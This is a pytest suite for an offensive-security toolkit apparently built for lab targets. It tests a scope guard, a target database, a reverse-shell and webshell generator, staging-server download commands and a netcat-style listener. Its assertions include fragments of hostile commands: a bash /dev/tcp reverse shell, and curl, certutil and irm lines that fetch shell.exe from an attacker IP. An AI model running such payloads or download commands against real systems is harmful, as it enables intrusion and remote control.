"""
Unit and Integration Test Suite for NeuroShell Cyber Edition.
Validates WSL Kali Bridge, Scope Guard, Target Graph, Payload Generation,
Staging Server, Listener Hub, Formatters, and Zero-Regression on Standard Edition.
"""

import tempfile
from pathlib import Path

import pytest

from editions.cyber import (
    CyberFormatter,
    ListenerManager,
    PayloadGenerator,
    ScopeGuard,
    StagingServerManager,
    TargetGraph,
    WSLKaliBridge,
    translate_cyber_intent,
)
from editions.standard import GitOps, UniversalCodeRunner


class TestWSLKaliBridge:
    def test_attacker_ip_detection(self):
        ip = WSLKaliBridge.get_attacker_ip()
        assert isinstance(ip, str)
        assert len(ip.split(".")) == 4

    def test_distro_detection(self):
        distro_info = WSLKaliBridge.detect_wsl_distro()
        assert isinstance(distro_info.available, bool)
        assert isinstance(distro_info.is_kali, bool)

    def test_build_exec_command(self):
        cmd = WSLKaliBridge.build_exec_command("whoami")
        assert cmd is not None


class TestScopeGuard:
    def setup_method(self):
        ScopeGuard.clear_scope()
        ScopeGuard.set_enabled(True)
        ScopeGuard.set_strict(True)

    def test_add_cidr_and_single_ip(self):
        assert ScopeGuard.add_target("192.168.1.0/24") is True
        assert ScopeGuard.add_target("10.10.10.5") is True
        assert ScopeGuard.add_target("target.htb") is True

        assert ScopeGuard.is_in_scope("192.168.1.15") is True
        assert ScopeGuard.is_in_scope("192.168.1.254") is True
        assert ScopeGuard.is_in_scope("10.10.10.5") is True
        assert ScopeGuard.is_in_scope("target.htb") is True
        assert ScopeGuard.is_in_scope("sub.target.htb") is True

        # Out of scope checks
        assert ScopeGuard.is_in_scope("192.168.2.1") is False
        assert ScopeGuard.is_in_scope("8.8.8.8") is False
        assert ScopeGuard.is_in_scope("google.com") is False

    def test_command_validation_blocks_out_of_scope(self):
        ScopeGuard.add_target("10.10.10.0/24")

        # In scope command
        safe, msg = ScopeGuard.validate_command("nmap -sS 10.10.10.50")
        assert safe is True

        # Out of scope command
        unsafe, err = ScopeGuard.validate_command("nmap -sS 172.16.50.1")
        assert unsafe is False
        assert "SCOPE GUARD VIOLATION" in err

    def test_extract_targets(self):
        targets = ScopeGuard.extract_targets("gobuster dir -u http://target.htb/admin -w wordlist.txt")
        assert "target.htb" in targets


class TestTargetGraph:
    def test_graph_lifecycle(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            db_path = Path(tmpdir) / "test_graph.db"
            graph = TargetGraph(db_path=db_path)

            graph.add_host("10.10.10.5", hostname="victim.htb", os_name="Linux 5.4")
            graph.add_port("10.10.10.5", 22, service="ssh", version="OpenSSH 8.2")
            graph.add_port("10.10.10.5", 80, service="http", version="Apache 2.4.41")
            graph.add_web_path("10.10.10.5", 80, "/admin", status_code=200, title="Admin Login")
            graph.add_credential("10.10.10.5", "ssh", "admin", "P@ssword123")

            hosts = graph.get_hosts()
            assert len(hosts) == 1
            assert hosts[0].ip == "10.10.10.5"

            ports = graph.get_ports("10.10.10.5")
            assert len(ports) == 2
            assert {p.port for p in ports} == {22, 80}

            creds = graph.get_credentials()
            assert len(creds) == 1
            assert creds[0].username == "admin"
            assert creds[0].secret == "P@ssword123"

            summary = graph.get_summary()
            assert summary["total_hosts"] == 1
            assert summary["total_open_ports"] == 2
            assert summary["total_credentials"] == 1


class TestPayloadGenerator:
    def test_generate_reverse_shells(self):
        # Bash
        res_bash = PayloadGenerator.generate("bash", lhost="10.10.14.2", lport=9001)
        assert "/dev/tcp/10.10.14.2/9001" in res_bash.payload
        assert res_bash.language == "bash"

        # Python
        res_py = PayloadGenerator.generate("python", lhost="10.10.14.2", lport=4444)
        assert "socket" in res_py.payload
        assert "pty.spawn" in res_py.payload

        # PowerShell
        res_ps = PayloadGenerator.generate("powershell", lhost="10.10.14.2", lport=4444)
        assert "System.Net.Sockets.TCPClient" in res_ps.payload

        # Base64 encoded
        res_b64 = PayloadGenerator.generate("bash", lhost="10.10.14.2", lport=9001, encode="base64")
        assert res_b64.is_encoded is True
        assert "base64" in res_b64.payload

    def test_generate_webshell(self):
        php_shell = PayloadGenerator.generate_webshell("php")
        assert "<?php" in php_shell
        assert "shell_exec" in php_shell or "system" in php_shell


class TestStagingServerManager:
    def test_pull_commands_generation(self):
        pull = StagingServerManager.generate_pull_commands("shell.exe", host="10.10.14.2", port=8000)
        assert "irm http://10.10.14.2:8000/shell.exe" in pull.windows_powershell
        assert "certutil" in pull.windows_certutil
        assert "curl -sSL http://10.10.14.2:8000/shell.exe" in pull.linux_curl
        assert "wget" in pull.linux_wget


class TestListenerManager:
    def test_build_listener_command(self):
        cfg = ListenerManager.build_listener_command(port=4444)
        assert cfg.port == 4444
        assert "4444" in cfg.command
        assert len(cfg.tty_upgrade_notes) >= 4


class TestCyberFormatter:
    def test_format_nmap_output(self):
        sample_nmap = """
Starting Nmap 7.94 at 2026-10-12 04:00
Nmap scan report for 10.10.10.5
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp   open  http    Apache httpd 2.4.41
443/tcp  open  ssl/http Apache httpd
Nmap done: 1 IP address (1 host up) scanned in 2.14 seconds
"""
        formatted = CyberFormatter.format_nmap(sample_nmap)
        assert "Discovered Ports & Services" in formatted
        assert "22/tcp" in formatted
        assert "Apache" in formatted

    def test_format_gobuster_output(self):
        sample_gobuster = """
===============================================================
/admin                (Status: 301) [Size: 312]
/login                (Status: 200) [Size: 1540]
/uploads              (Status: 403) [Size: 278]
===============================================================
"""
        formatted = CyberFormatter.format_gobuster(sample_gobuster)
        assert "Discovered Web Endpoints" in formatted
        assert "/admin" in formatted
        assert "/login" in formatted


class TestCyberPatterns:
    def test_plain_english_cyber_translations(self):
        cmd1 = translate_cyber_intent("stealth syn scan 10.10.10.5")
        assert cmd1 == "nmap -sS -Pn 10.10.10.5"

        cmd2 = translate_cyber_intent("fuzz directories on http://target.htb")
        assert "gobuster dir -u http://target.htb" in cmd2

        cmd3 = translate_cyber_intent("crack sha256 hash hash.txt")
        assert "hashcat -m 1400" in cmd3

        cmd4 = translate_cyber_intent("find suid binaries")
        assert "find / -perm -4000" in cmd4


class TestZeroRegressionStandardEdition:
    def test_standard_edition_exports(self):
        # Guarantee that standard edition re-exports are untouched and fully functional
        runner = UniversalCodeRunner()
        assert runner is not None
        lang = runner.identify_language("script.py")
        assert lang == "python"

        git = GitOps()
        assert git is not None
